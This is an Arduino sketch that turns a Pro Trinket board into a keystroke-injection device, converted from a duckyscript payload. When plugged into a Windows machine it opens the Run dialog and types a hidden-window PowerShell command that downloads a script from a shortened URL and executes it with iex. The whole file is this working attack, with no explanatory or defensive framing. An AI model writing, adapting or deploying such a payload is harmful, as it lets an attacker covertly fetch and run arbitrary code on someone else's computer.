#include <ProTrinketKeyboard.h>
void setup() {
  // put your setup code here, to run once:
  TrinketKeyboard.begin();
}

void loop() {
  // Wait for init
  TrinketKeyboard.poll();
  delay(500);

  // Start converted duckyscript
  TrinketKeyboard.poll();
  delay(600);

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
  TrinketKeyboard.pressKey(0, 0);
  TrinketKeyboard.poll();
  delay(150);
  TrinketKeyboard.print("powershell -windowstyle hidden iex (wget http://bit.ly/2s9K94Y)");
  TrinketKeyboard.poll();
  delay(100);
  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0, 0);
  while (true) {
    TrinketKeyboard.poll();
  }
}
